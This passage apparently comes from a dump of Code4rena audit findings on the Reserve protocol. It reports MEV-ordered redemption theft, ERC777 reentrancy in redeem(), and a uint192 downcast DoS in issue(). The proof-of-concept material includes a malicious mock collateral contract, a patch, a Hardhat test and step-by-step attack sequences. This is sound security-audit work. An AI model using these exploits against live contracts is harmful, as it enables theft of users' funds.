timelock.revokeRole(timelock.TIMELOCK_ADMIN_ROLE(), address(this)); // Revoke admin role + +            // Set new owner to timelock +            newOwner = address(timelock); +        } else { +            require(owner != address(0), \"owner not defined\"); +            newOwner = owner; +        } + +        // Setup guardian as freeze starter / extender + pauser +        if (guardian != address(0)) { +            // As a further decentralization step it is suggested to further differentiate between +            // these two roles. But this is what will make sense for simple system setup. +            main.grantRole(SHORT_FREEZER, guardian); +            main.grantRole(LONG_FREEZER, guardian); +            main.grantRole(PAUSER, guardian); +        } + +        // Setup Pauser +        if (pauser != address(0)) { +            main.grantRole(PAUSER, pauser); +        } + +        // Unpause if required +        if (unpause) { +            main.unpause(); +        } + +        // Transfer Ownership and renounce roles +        main.grantRole(OWNER, newOwner); +        main.grantRole(SHORT_FREEZER, newOwner); +        main.grantRole(LONG_FREEZER, newOwner); +        main.grantRole(PAUSER, newOwner); +        main.renounceRole(OWNER, address(this)); +        main.renounceRole(SHORT_FREEZER, address(this)); +        main.renounceRole(LONG_FREEZER, address(this)); +        main.renounceRole(PAUSER, address(this)); +    } +} diff --git a/contracts/p1/mixins/RecollateralizationLib.sol b/contracts/p1/mixins/RecollateralizationLib.sol index 648d1813..ed058a0d 100644 --- a/contracts/p1/mixins/RecollateralizationLib.sol +++ b/contracts/p1/mixins/RecollateralizationLib.sol @@ -435,14 +435,11 @@ library RecollateralizationLibP1 {            // accumulate shortfall          for (uint256 i = 0; i < len; ++i) { -            uint192 q = components.bh.quantity(basketERC20s[i]); -            if (q == 0) continue; // can happen if current basket is out of sync with registry +            ICollateral coll = components.reg.toColl(basketERC20s[i]);                // {tok} = {BU} * {tok/BU}              // needed: quantity of erc20 needed for `basketsTop` BUs -            uint192 needed = basketsTop.mul(q, CEIL); // {tok} - -            ICollateral coll = components.reg.toColl(basketERC20s[i]); +            uint192 needed = basketsTop.mul(components.bh.quantity(basketERC20s[i]), CEIL); // {tok}                // held: quantity of erc20 owned by the bm (BackingManager)              uint192 held = coll.bal(address(components.bm)); // {tok} diff --git a/contracts/plugins/assets/FiatCollateral.sol b/contracts/plugins/assets/FiatCollateral"}, {"title": "Redemptions during undercollateralization can be hot-swapped to steal all funds", "html_url": "https://github.com/code-423n4/2023-01-reserve-findings/issues/399", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-04"], "target": "2023-01-reserve-findings", "body": "# Lines of code  https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/p1/RToken.sol#L420   # Vulnerability details  ## Impact During recollateralization/a switch basket/when the protocol collateral isn't sound, a user can have almost their entire redemption transaction hot swapped for nothing.   For example, trying to redeem 1M collateral for 1M rTokens could have the user end up with 0 collateral and 0 rTokens, just by calling the `redeem` function at the wrong time.   Example: - User A issues 1M rToken for 1M tokenA - Evil user sees tokenA is about to become disabled, and that User A sent a normally innocuous redeem tx for too much underlying collateral in the mempool  - Evil user orders transactions so they and RSR/Rtoken holders can steal user A's funds  - They first buy a ton of tokenA and send it to the backing Manager - They call `manageTokens` which flash issues a ton of new Rtoken due to the inflated tokenA balance, increasing the totalSupply - The increase in total supply allows the normal redemption cap to be drastically lifted - They then let the disabling of tokenA process, and calls refreshBasket where a backup token (tokenB) kicks in - We are now undercollateralized, and evil user sends tokenB dust to the backingmanager  - FINALLY: the original redemption TX is ordered, and due to the inflated RToken supply, the battery discharge amount is also inflated, allowing the redemption to go through. Due to the new collateral in place, they redeem ALL their Rtoken (1M) for dust of tokenB!! The protocol has essentially honeypotted them!!  ## Proof of Concept We provide the proof of code in [proof of code](#proof-of-code).   1. MEV  This relies on a validator being malicious with for-profit motives. It would be pretty easy for them to setup a bot looking for this exact scenario though and just staying dormant till the time is right. If they get to order the transactions, they can make a fat profit from the victim.   2. Backing manager can flash issue RToken  If the backingManger has too many excess assets, it will flash issue as [many RTokens as](https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/p1/BackingManager.sol#L201) possible to even the collateral to RTokens.  ``` function handoutExcessAssets(IERC20[] calldata erc20s) private { . . if (held.gt(needed)) { . . rToken.mint(address(this), uint256(rTok)); ```  3. Increasing the supply increases the redemption and issuance block cap  The RedemptionBattery's currentCharge function is [dependent on the total supply of RTokens](https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/libraries/RedemptionBattery.sol#L59). So if the total supply is raised, you can redeem way more than you should be able to.  ``` uint256 amtPerHour = (supply * battery.scalingRedemptionRate) / FIX_ONE_256; ```  (This also is true for issuance.)  4. Anyone can call [refreshBasket when a collateral](https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/p1/BasketHandler.sol#L179) is disabled  ``` function refreshBasket() external {         assetRegistry.refresh();          require(             main.hasRole(OWNER, _msgSender()) ||                 (status() == CollateralStatus.DISABLED && !main.pausedOrFrozen()),             \"basket unrefreshable\"         );         _switchBasket();     } ```  So if I see a tx where a collateral is about to be disabled, I can chain it with the refreshbasket TX myself.  5. Redemptions can occur when protocol is undercollateralized  The `redeem` function has this check:  ``` require(basketHandler.status() != CollateralStatus.DISABLED, \"collateral default\"); ```  Which checks if the collateral is good, but NOT if the protocol is fullyCollateralized. Since we chain the disabled asset with the refreshBasket TX, the backup collateral kicks in, and the collateral status becomes `SOUND`. However, normally, we'd have 0 of the new collateral and any redemptions would fail, since there isn't anything to give back.  6. Sending dust to backing manager  So, if you send a tiny tiny bit of the new collateral to the protocol, the protocol will process the redemption and give them their `prorata` share of the collateral, which right now is almost 0, but still burn all the rToken being redeemed.  [RToken.sol](https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/p1/RToken.sol#L475) ``` // amount is never changed, they burn all the rToken // in our example above, all 1M Rtoken are burned! _burn(redeemer, amount); ``` And we calculate how much they get back like so. We see how much $ we currently have in the basket, and hand back those amounts accordingly. Since we have almost no money, we are going to give them almost nothing for their rTokens.  ``` (address[] memory erc20s, uint256[] memory amounts) = basketHandler.quote(baskets, FLOOR); uint256 erc20length = erc20s.length; // Bound each withdrawal by the prorata share, in case we're currently under-collateralized         for (uint256 i = 0; i < erc20length; ++i) {             // {qTok}             uint256 bal = IERC20Upgradeable(erc20s[i]).balanceOf(address(backingManager));              // gas-optimization: only do the full mulDiv256 if prorate is 0             uint256 prorata = (prorate > 0)                 ? (prorate * bal) / FIX_ONE // {qTok} = D18{1} * {qTok} / D18                 : mulDiv256(bal, amount, supply); // {qTok} = {qTok} * {qRTok} / {qRTok}              if (prorata < amounts[i]) amounts[i] = prorata;         } ```  And just like that, a seemingly innocuous redemption transaction was a trap the whole time. The next step would be to go through the rest of the process to see how much our evil user profited (from running the auctions), as they need to be a whale to inflate the RToken supply. However, we've seen attacks like this, and one could consider it a [highly profitable trading strategy](https://twitter.com/avi_eisen/status/1581326197241180160?s=20&t=8WpEg76bW_Kk8YaJ5orP5Q). If they buy up majority shares in the RToken, or, they coordinate with most of the StRSR token holders they could advertise and honey pot people to do redemptions whenever a switchBasket is coming. Spread FUD like \"you need to redeem otherwise you'll lose money!\" and it's the redeeming that actually steals their money.   ## Tools Used  Hardhat  ## Recommended Mitigation Steps  Disallow issuance/redemptions while the protocol is undercollateralized.   ## Proof Of Code To run: 1. git clone https://github.com/reserve-protocol/protocol.git 2. cd protocol 3. Copy paste the below code to a file like `/tmp/changes.patch` 4. git apply /tmp/changes.patch 5. yarn 6. yarn hardhat test test/mev-redemption.ts  ``` diff --git a/contracts/ShitAsset.sol b/contracts/ShitAsset.sol new file mode 100644 index 00000000..5420e914 --- /dev/null +++ b/contracts/ShitAsset.sol @@ -0,0 +1,222 @@ +// SPDX-License-Identifier: BlueOak-1.0.0 +pragma solidity 0.8.9; + +import \"@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol\"; +import \"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\"; +import \"./plugins/assets/OracleLib.sol\"; +import \"hardhat/console.sol\"; + +contract ShitAsset { +    using FixLib for uint192; +    using OracleLib for AggregatorV3Interface; + +    // AggregatorV3Interface public immutable chainlinkFeed; // {UoA/tok} + +    IERC20Metadata private s_erc20; +    bool revertErc20 = false; + +    CollateralStatus myStatus; + +    uint8 public immutable erc20Decimals; + +    uint192 public immutable maxTradeVolume; // {UoA} + +    uint48 public immutable oracleTimeout; // {s} Seconds that an oracle value is considered valid + +    // uint192 public immutable oracleError; // {1} The max % deviation allowed by the oracle + +    // === Lot price === + +    uint48 public immutable priceTimeout; // {s} The period over which `savedHighPrice` decays to 0 + +    uint192 public savedLowPrice; // {UoA/tok} The low price of the token during the last update + +    uint192 public savedHighPrice; // {UoA/tok} The high price of the token during the last update + +    uint48 public lastSave; // {s} The timestamp when prices were last saved + +    string public name; + +    /// @param priceTimeout_ {s} The number of seconds over which savedHighPrice decays to 0 +    /// @param chainlinkFeed_ Feed units: {UoA/tok} +    /// @param oracleError_ {1} The % the oracle feed can be off by +    /// @param maxTradeVolume_ {UoA} The max trade volume, in UoA +    /// @param oracleTimeout_ {s} The number of seconds until a oracle value becomes invalid +    constructor( +        uint48 priceTimeout_, +        AggregatorV3Interface chainlinkFeed_, +        uint192 oracleError_, // @follow-up , this can change +        IERC20Metadata erc20_, +        uint192 maxTradeVolume_, +        uint48 oracleTimeout_ +    ) { +        require(priceTimeout_ > 0, \"price timeout zero\"); +        require(address(chainlinkFeed_) != address(0), \"missing chainlink feed\"); +        require(oracleError_ > 0 && oracleError_ < FIX_ONE, \"oracle error out of range\"); +        require(address(erc20_) != address(0), \"missing erc20\"); +        require(maxTradeVolume_ > 0, \"invalid max trade volume\"); +        require(oracleTimeout_ > 0, \"oracleTimeout zero\"); +        priceTimeout = priceTimeout_; +        // chainlinkFeed = chainlinkFeed_; +        // oracleError = oracleError_; +        s_erc20 = erc20_; +        // erc20 = IERC20Metadata(0x000000000000000000000000000000000000dEaD); +        erc20Decimals = s_erc20.decimals(); +        maxTradeVolume = maxTradeVolume_; +        oracleTimeout = oracleTimeout_; +        myStatus = CollateralStatus.SOUND; +        savedLowPrice = 0; +        savedHighPrice = 0; +    } + +    function updateErc20(address newErc20) public { +        if (newErc20 == address(0)) { +            revertErc20 = true; +        } +        s_erc20 = IERC20Metadata(newErc20); +    } + +    /// Can revert, used by other contract functions in order to catch errors +    /// Should not return FIX_MAX for low +    /// Should only return FIX_MAX for high if low is 0 +    /// @dev The third (unused) variable is only here for compatibility with Collateral +    /// @param low {UoA/tok} The low price estimate +    /// @param high {UoA/tok} The high price estimate +    function tryPrice() external view virtual returns (uint192 low, uint192 high, uint192) { +        // uint192 p = chainlinkFeed.price(oracleTimeout); // {UoA/tok} +        // uint192 delta = p.mul(oracleError); +        // return (p - delta, p + delta, 0); +        return (savedLowPrice, savedHighPrice, uint192(0)); +    } + +    function updatePrice(uint192 low, uint192 high) public { +        savedLowPrice = uint192(low); +        savedHighPrice = uint192(high); +        lastSave = uint48(block.timestamp); +    } + +    /// Should not revert +    /// Refresh saved prices +    function refresh() public virtual { +        // // @follow-up +        // // wonder if you could make this more gas efficient returning _? +        // try this.tryPrice() returns (uint192 low, uint192 high, uint192) { +        //     // {UoA/tok}, {UoA/tok} +        //     // (0, 0) is a valid price; (0, FIX_MAX) is unpriced +        //     // Save prices if priced +        //     if (high < FIX_MAX) { +        //         savedLowPrice = low; +        //         savedHighPrice = high; +        //         lastSave = uint48(block.timestamp); +        //     } else { +        //         // must be unpriced +        //         // @follow-up +        //         // @pat why not revert here? +        //         assert(low == 0); +        //     } +        // } catch (bytes memory errData) { +        //     // see: docs/solidity-style.md#Catching-Empty-Data +        //     // @follow-up their docs should be updated, they no longer apply to this... +        //     // Why are they not being marked to iffy here? +        //     if (errData.length == 0) revert(); // solhint-disable-line reason-string +        // } +    } + +    // Should not revert +    //@dev Should be general enough to not need to be overridden +    // @return {UoA/tok} The lower end of the price estimate +    // @return {UoA/tok} The upper end of the price estimate +    function price() public view virtual returns (uint192, uint192) { +        try this.tryPrice() returns (uint192 low, uint192 high, uint192) { +            assert(low <= high); +            return (low, high); +        } catch (bytes memory errData) { +            // see: docs/solidity-style.md#Catching-Empty-Data +            if (errData.length == 0) revert(); // solhint-disable-line reason-string +            return (0, FIX_MAX); +        } +    } + +    // Should not revert +    // lotLow should be nonzero when the asset might be worth selling +    // @dev Should be general enough to not need to be overridden +    // @return lotHigh {UoA/tok} The upper end of the lot price estimate +    function lotPrice() external view virtual returns (uint192 lotLow, uint192 lotHigh) { +        try this.tryPrice() returns (uint192 low, uint192 high, uint192) { +            // if the price feed is still functioning, use that +            lotLow = low; +            lotHigh = high; +        } catch (bytes memory errData) { +            // see: docs/solidity-style.md#Catching-Empty-Data +            if (errData.length == 0) revert(); // solhint-disable-line reason-string + +            // if the price feed is broken, use a decayed historical value + +            uint48 delta = uint48(block.timestamp) - lastSave; // {s} +            if (delta >= priceTimeout) return (0, 0); // no price after timeout elapses + +            // {1} = {s} / {s} +            uint192 lotMultiplier = divuu(priceTimeout - delta, priceTimeout); + +            // {UoA/tok} = {UoA/tok} * {1} +            lotLow = savedLowPrice.mul(lotMultiplier); +            lotHigh = savedHighPrice.mul(lotMultiplier); +        } +        assert(lotLow <= lotHigh); +    } + +    // @return {tok} The balance of the ERC20 in whole tokens +    function bal(address account) external view returns (uint192) { +        return shiftl_toFix(s_erc20.balanceOf(account), -int8(erc20Decimals)); +    } + +    function isCollateral() external pure virtual returns (bool) { +        return true; +    } + +    // solhint-disable no-empty-blocks + +    /// Claim rewards earned by holding a balance of the ERC20 token +    /// @dev Use delegatecall +    function claimRewards() external virtual {} + +    // solhint-enable no-empty-blocks +    enum CollateralStatus { +        SOUND, +        IFFY, // When a peg is not holding or a chainlink feed is stale +        DISABLED // When the collateral has completely defaulted +    } + +    function updateStatus(CollateralStatus newStatus) public { +        myStatus = newStatus; +    } + +    // collateral stuff +    function status() public view returns (CollateralStatus) { +        return myStatus; +    } + +    function updateName(string memory newName) public { +        name = newName; +    } + +    function targetName() public view returns (bytes32) { +        // this is \"shit\" in hex +        return 0x7368697400000000000000000000000000000000000000000000000000000000; +    } + +    function targetPerRef() public view returns (uint192) { +        return FIX_ONE; +    } + +    function refPerTok() public view returns (uint192) { +        return FIX_ONE; +    } + +    function erc20() public view returns (IERC20Metadata) { +        if (revertErc20) { +            revert(\"revertErc20\"); +        } +        return s_erc20; +    } +} diff --git a/contracts/facade/PatrickFacadeWrite.sol b/contracts/facade/PatrickFacadeWrite.sol new file mode 100644 index 00000000..72be7d3a --- /dev/null +++ b/contracts/facade/PatrickFacadeWrite.sol @@ -0,0 +1,214 @@ +// SPDX-License-Identifier: BlueOak-1.0.0 +pragma solidity 0.8.9; + +import \"../interfaces/IFacadeWrite.sol\"; +import \"./lib/FacadeWriteLib.sol\"; +import \"hardhat/console.sol\"; + +/** + * @title FacadeWrite + * @notice A UX-friendly layer to interact with the protocol + * @dev Under the hood, uses two external libs to deal with blocksize limits. + */ +contract PatrickFacadeWrite is IFacadeWrite { +    using FacadeWriteLib for address; + +    IDeployer public immutable deployer; + +    constructor(IDeployer deployer_) { +        require(address(deployer_) != address(0), \"invalid address\"); +        deployer = deployer_; +    } + +    /// Step 1 +    function deployRToken( +        ConfigurationParams calldata config, +        SetupParams calldata setup +    ) external returns (address) { +        // Perform validations +        require(setup.primaryBasket.length > 0, \"no collateral\"); +        require(setup.primaryBasket.length == setup.weights.length, \"invalid length\"); + +        // Validate backups +        for (uint256 i = 0; i < setup.backups.length; ++i) { +            require(setup.backups[i].backupCollateral.length > 0, \"no backup collateral\"); +        } + +        // Validate beneficiaries +        for (uint256 i = 0; i < setup.beneficiaries.length; ++i) { +            require( +                setup.beneficiaries[i].beneficiary != address(0) && +                    (setup.beneficiaries[i].revShare.rTokenDist > 0 || +                        setup.beneficiaries[i].revShare.rsrDist > 0), +                \"beneficiary revShare mismatch\" +            ); +        } + +        // Deploy contracts +        IRToken rToken = IRToken( +            deployer.deploy( +                config.name, +                config.symbol, +                config.mandate, +                address(this), // set as owner +                config.params +            ) +        ); + +        // Get Main +        IMain main = rToken.main(); +        IAssetRegistry assetRegistry = main.assetRegistry(); +        IBackingManager backingManager = main.backingManager(); +        IBasketHandler basketHandler = main.basketHandler(); + +        // Register assets +        for (uint256 i = 0; i < setup.assets.length; ++i) { +            require(assetRegistry.register(setup.assets[i]), \"duplicate asset\"); +            backingManager.grantRTokenAllowance(setup.assets[i].erc20()); +        } + +        // Setup basket +        { +            IERC20[] memory basketERC20s = new IERC20[](setup.primaryBasket.length); + +            // Register collateral +            for (uint256 i = 0; i < setup.primaryBasket.length; ++i) { +                // require(assetRegistry.register(setup.primaryBasket[i]), \"duplicate collateral\"); +                assetRegistry.register(setup.primaryBasket[i]); +                IERC20 erc20 = setup.primaryBasket[i].erc20(); + +                basketERC20s[i] = erc20; +                backingManager.grantRTokenAllowance(erc20); +            } + +            // Set basket + +            // can't issue without setting and call ing refresh +            basketHandler.setPrimeBasket(basketERC20s, setup.weights); +            basketHandler.refreshBasket(); +        } + +        // Setup backup config +        { +            for (uint256 i = 0; i < setup.backups.length; ++i) { +                IERC20[] memory backupERC20s = new IERC20[]( +                    setup.backups[i].backupCollateral.length +                ); + +                for (uint256 j = 0; j < setup.backups[i].backupCollateral.length; ++j) { +                    ICollateral backupColl = setup.backups[i].backupCollateral[j]; +                    assetRegistry.register(backupColl); // do not require the asset is new +                    IERC20 erc20 = backupColl.erc20(); +                    backupERC20s[j] = erc20; +                    backingManager.grantRTokenAllowance(erc20); +                } + +                basketHandler.setBackupConfig( +                    setup.backups[i].backupUnit, +                    setup.b"}, {"title": "attacker can steal RToken holders funds by performing reentrancy attack during redeem() function token transfers", "html_url": "https://github.com/code-423n4/2023-01-reserve-findings/issues/347", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-07"], "target": "2023-01-reserve-findings", "body": "# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514 https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L105-L150   # Vulnerability details  ## Impact Function `redeem()` redeems RToken for basket collateral and it updated `basketsNeeded` and transfers users basket ERC20 from BackingManager to user address. it loops through tokens and transfer them to caller and if one of tokens were ERC777 or any other 3rd party protocol token with hook, attacker can perform reentrancy attack during token transfers. Attacker can cause multiple impacts by choosing the reentrancy function: 1. attacker can call `redeem()` again and bypass \"bounding each withdrawal by the prorata share when protocol is under-collateralized\" because tokens balance of BackingManager is not updated yet. 2. attacker can call `BackingManager.manageTokens()` and because `basketsNeeded` gets decreased and basket tokens balances of BasketManager are not updated, code would detect those tokens as excess funds and would distribute them between RSR stakers and RToken holders and some of RToken deposits would get transferred to RSR holders as rewards.  ## Proof of Concept This is `redeem()` code: ```     function redeem(uint256 amount) external notFrozen { ............... ...............         (address[] memory erc20s, uint256[] memory amounts) = basketHandler.quote(baskets, FLOOR);          uint256 erc20length = erc20s.length;          uint192 prorate = uint192((FIX_ONE_256 * amount) / supply);          // Bound each withdrawal by the prorata share, in case we're currently under-collateralized         for (uint256 i = 0; i < erc20length; ++i) {             uint256 bal = IERC20Upgradeable(erc20s[i]).balanceOf(address(backingManager));              uint256 prorata = (prorate > 0)                 ? (prorate * bal) / FIX_ONE // {qTok} = D18{1} * {qTok} / D18                 : mulDiv256(bal, amount, supply); // {qTok} = {qTok} * {qRTok} / {qRTok}              if (prorata < amounts[i]) amounts[i] = prorata;         }          basketsNeeded = basketsNeeded_ - baskets;         emit BasketsNeededChanged(basketsNeeded_, basketsNeeded);          // == Interactions ==         _burn(redeemer, amount);          bool allZero = true;         for (uint256 i = 0; i < erc20length; ++i) {             if (amounts[i] == 0) continue;             if (allZero) allZero = false;              IERC20Upgradeable(erc20s[i]).safeTransferFrom(                 address(backingManager),                 redeemer,                 amounts[i]             );         }          if (allZero) revert(\"Empty redemption\");     } ``` As you can see code calculates withdrawal amount of each basket erc20 tokens by calling `basketHandler.quote()` and then bounds each withdrawal by the prorata share of token balance, in case protocol is under-collateralized. and then code updates `basketsNeeded` and in the end transfers the tokens.  if one of those tokens were ERC777 then that token would call receiver hook function in token transfer. there may be other 3rd party protocol tokens that calls registered hook functions during the token transfer. as reserve protocol is permission less and tries to work with all tokens so the external call in the token transfer can call hook functions. attacker can use this hook and perform reentrancy attack. This is `fullyCollateralized()` code in BasketHandler: ```     function fullyCollateralized() external view returns (bool) {         return basketsHeldBy(address(backingManager)) >= rToken.basketsNeeded();     } ``` As you can see it calculates baskets that can be held by backingManager tokens balance and needed baskets by RToken contract and by comparing them determines that if RToken is fully collateralized or not. if RToken is fully collateralized then `BackingManager.manageTokens()` would call `handoutExcessAssets()` and would distributes extra funds between RToken holders and RSR stakers. the root cause of the issue is that during tokens transfers in `redeem()` not all the basket tokens balance of the BackingManager updates once and if one has hook function which calls attacker contract then attacker can use this updated token balance of the contract and perform his reentrancy attack. attacker can call different functions for reentrancy. these are two scenarios: ** scenario #1: attacker call `redeem()` again and bypass prorata share bound check when protocol is under-collaterialized: 1. tokens [`SOME_ERC777`, `USDT`] with quantity [1, 1] are in the basket right now and basket nonce is BasketNonce1. 2. BackingManager has 200K `SOME_ERC777` balance and 100K `USDT` balance. `basketsNeeded` in RToken is 150K and RToken supply is 150K and attacker address Attacker1 has 30k RToken. battery charge allows for attacker to withdraw 30K tokens in one block. 3. attacker would register a hook for his address in `SOME_ERC777` token to get called during transfers. 4. attacker would call `redeem()` to redeem 15K RToken and code would updated `basketsNeeded` to 135K and code would bounds withdrawal by prorata shares of balance of the BackingManager because protocol is under-collateralized and code would calculated withdrawal amouns as 15K `SOME_ERC777` tokens and 10K `USDT` tokens (instead of 15K `USDT` tokens) for withdraws. 5. then contract would transfer 15K `SOME_ERC777` tokens first to attacker address and attacker contract would get called during the hook function and now `basketsNeeded` is 135K and total RTokens is 135K and BackingManager balance is 185K `SOME_ERC777` and 100K `USDT` (`USDT` is not yet transferred). then attacker contract can call `redeem()` again for the remaining 15K RTokens. 6. because protocol is under-collateralized code would calculated withdrawal amouns as 15K `SOME_ERC777` and 11.1K `USDT` (USDT_balance * rtokenAmount / totalSupply = 100K * 15K / 135K) and it would burn 15K RToken form caller and the new value of totalSupply of RTokens would be 120K and `basketsNeeded` would be 120K too. then code would transfers 15K `SOME_ERC777` and 11.1K `USDT` for attacker address.  7. attacker's hook function would return and `redeem()` would transfer 10K `USDT` to attacker in the rest of the execution. attacker would receive 30K `SOME_ERC777` and 21.1K `USDT` tokens for 15K redeemed RToken but attacker should have get (`100 * 30K / 150K = 20K`) 20K `USDT` tokens because of the bound each withdrawal by the prorata share, in case we're currently under-collateralized. 8. so attacker would be able to bypass the bounding check and withdraw more funds and stole other users funds. the attack is more effective if withdrawal battery charge is higher but in general case attacker can perform two withdraw each with about `charge/2` amount of RToken in each block and stole other users funds when protocol is under collaterlized.  ** scenario #2: attacker can call `BackingManager.manageTokens()` for reentrancy call: 1. tokens [`SOME_ERC777`, `USDT`] with quantity [1, 1] are in the basket right now and basket nonce is BasketNonce1. 2. BackingManager has 200K `SOME_ERC777` balance and 150K `USDT` balance. `basketsNeeded` in RToken is 150K and RToken supply is 150K and attacker address Attacker1 has 30k RToken. battery charge allows for attacker to withdraw 30K tokens in one block. 3. attacker would register a hook for his address in `SOME_ERC777` token to get called during transfers. 4. attacker would call `redeem()` to redeem 30K RToken and code would updated `basketsNeeded` to 120K and burn 30K RToken and code would calculated withdrawal amounts as 30K `SOME_ERC777` tokens and 30K `USDT` tokens for withdraws. 5. then contract would transfer 30K `SOME_ERC777` tokens first to attacker address and attacker contract would get called during the hook function and now `basketsNeeded` is 120K and total RTokens is 120K and BackingManager balance is 170K `SOME_ERC777` and 150K `USDT` (`USDT` is not yet transferred). then attacker contract can call `BackingManager.manageTokens()`. 6. function `manageTokens()` would calculated baskets can held by BackingManager and it would be higher than 150K and `basketsNeeded` would be 130K and code would consider 60K `SOME_ERC777` and 30K `USDT` tokens as revenue and try to distribute it between RSR stakers and RToken holders. code would mint 30K RTokens and would distribute it. 7. then attacker hook function would return and `redeem()` would transfer 30K `USDT` to attacker address in rest of the execution. 8. so attacker would able to make code to calculate RToken holders backed tokens as revenue and distribute it between RSR stakers and RSR stakers would receive RTokens backed tokens as rewards. the attack is more effective is battery charge is high but in general case attacker can call redeem for battery charge amount and cause those funds to be counted and get distributed to the RSR stakers (according to the rewards distribution rate)  ## Tools Used VIM  ## Recommended Mitigation Steps prevent reading reentrancy attack by central reentrancy guard or by one main proxy interface contract that has reentrancy guard. or create contract state (similar to basket nonce) which changes after each interaction and check for contracts states change during the call. (start and end of the call) "}, {"title": "Unsafe downcasting in `issue(...)` can be exploited to cause permanent DoS", "html_url": "https://github.com/code-423n4/2023-01-reserve-findings/issues/320", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "satisfactory", "selected for report", "sponsor confirmed", "M-10"], "target": "2023-01-reserve-findings", "body": "# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L230-L243   # Vulnerability details  ## Unsafe downcasting in `issue(...)` can be exploited to cause permanent DoS  #### Important note! I first found this bug in `issue(...)` at first, but unsafe downcasting appears in many other areas of the codebase, and seem to also be exploitable but no PoC is provided due to time constraints. Either way, using some form of safe casting library to **replace all occurences** of unsafe downcasting will prevent all the issues. I also do not list the individual instances of unsafe downcasting as all occurences should be replaced with safe cast.  ### Details The `amtRToken` is a user supplied parameter in the `issue(uint256 amtRToken)` function ```sol uint192 amtBaskets = uint192(  totalSupply() > 0 ? mulDiv256(basketsNeeded, amtRToken, totalSupply()) : amtRToken ); ``` The calculated amount is unsafely downcasted into `uint192`.  This means that if the resulting calculation is a multiple of $2^{192}$, `amtBaskets = 0`  The code proceeds to the following line, where `erc20s` and `deposits` arrays will be empty since we are asking for a quote for 0. (see `quote(...)` in `BasketHandler.sol` where amounts are multiplied by zero) ```sol (address[] memory erc20s, uint256[] memory deposits) = basketHandler.quote(             amtBaskets,             CEIL         ); ``` This means an attacker can call `issue(...)` with a very high `amtRToken` amount that is a multiple of $2^{192}$, without depositing any amount of collateral.  The DoS issues arises because `whenFinished(uint256 amtRToken)` is dependent on `amtRToken`. With such a high value, `allVestAt` will be set so far in the future that it causes a permanent DoS. i.e. Issuances will never vest. ```sol uint192 vestingEnd = whenFinished(amtRToken); // D18{block number} ```  ### Proof of Concept This PoC demonstrates that an attacker can call `issue(...)` without collateral tokens to modify `allVestAt` variable to an extreme value, such that all further issuances cannot be vested for all users.  Do note that the PoC is done with `totalSupply() == 0` case, so we supply `amtRToken` as a multiple of $2^{192}$. Even if there is an existing `totalSupply()`, we just need to calculate a value for `amtRToken >= 2^192` such that $\\frac{\\text{basketsNeeded} \\times \\text{amtRToken}}{totalSupply()} = 0$. This attack does not require `totalSupply()` be zero.  ```sol uint192 amtBaskets = uint192(  totalSupply() > 0 ? mulDiv256(basketsNeeded, amtRToken, totalSupply()) : amtRToken ); ```  The `amount`, `baskets` and `quantities` values are also messed up, but it would not matter anyways...  Under 'Issuance and Slow Minting' tests in `RToken.test.ts`: ```sol it('Audit: DoS by downcasting', async function () {       const issueAmount: BigNumber = BigNumber.from(2n ** 192n)        // Set basket       await basketHandler.connect(owner).setPrimeBasket([token0.address], [fp('1')])       await basketHandler.connect(owner).refreshBasket()        // Attacker issues 2 ** 192, or a multiple of 2 ** 192 RTokens       // This will cause allVestAt to be veryyyyy high, permanent DoS       const tx = await rToken.connect(addr1)['issue(uint256)'](issueAmount)       const receipt = await tx.wait()       console.log(receipt.events[0].args)          await token0.connect(addr2).approve(rToken.address, initialBal)       const tx2 = await rToken.connect(addr2)['issue(uint256)'](initialBal)       const receipt2 = await tx2.wait()       console.log(receipt2.events[0].args)        // one eternity later...       await advanceTime('123456789123456789')       // and still not ready       await expect(rToken.connect(addr2).vest(addr2.address, 1))         .to.be.revertedWith(\"issuance not ready\")      }) ``` Run with: ```bash yarn test:p1 --grep \"Audit: DoS\" ``` Expect to see (only important parts shown): ```bash [   ...   recipient: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',   index: BigNumber { value: \"0\" },   amount: BigNumber { value: \"6277101735386680763835789423207666416102355444464034512896\" },   baskets: BigNumber { value: \"0\" },   erc20s: [ '0x998abeb3E57409262aE5b751f60747921B33613E' ],   quantities: [ BigNumber { value: \"0\" } ],   blockAvailableAt: BigNumber { value: \"627710173538668076383578942320766744610235544446403452\" } ] [   ...   recipient: '0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC',   index: BigNumber { value: \"0\" },   amount: BigNumber { value: \"6300000000000000000000000000000000000000000000000000000000\" },   baskets: BigNumber { value: \"22898264613319236164210576792333583897644555535965487104\" },   erc20s: [ '0x998abeb3E57409262aE5b751f60747921B33613E' ],   quantities: [     BigNumber { value: \"22898264613319236164210576792333583897644555535965487104\" }   ],   blockAvailableAt: BigNumber { value: \"1257710173538668076383578942320766744610235544446403452\" } ]    RTokenP1 contract     Issuance and Slow Minting       \u2714 Audit: DoS by downcasting ```  ### Impact Permanent DoS would be High risk considering RToken is an asset-backed **currency**. _A currency that is unable to issue new currency does not work as a currency_  Also, I believe existing collateral cannot be redeemed due to the extreme values also used in `redeem(...)` function. No PoC written due to time constriant for this case... but above should be enough impact.  Many other downcasting issues for this project. But using a safe casting library would prevent all the issues... not going to write multiple reports for same underlying issue.  ### Recommendations Use some safe casting library. OpenZeppelin's library does not have safe casting for `uint192` 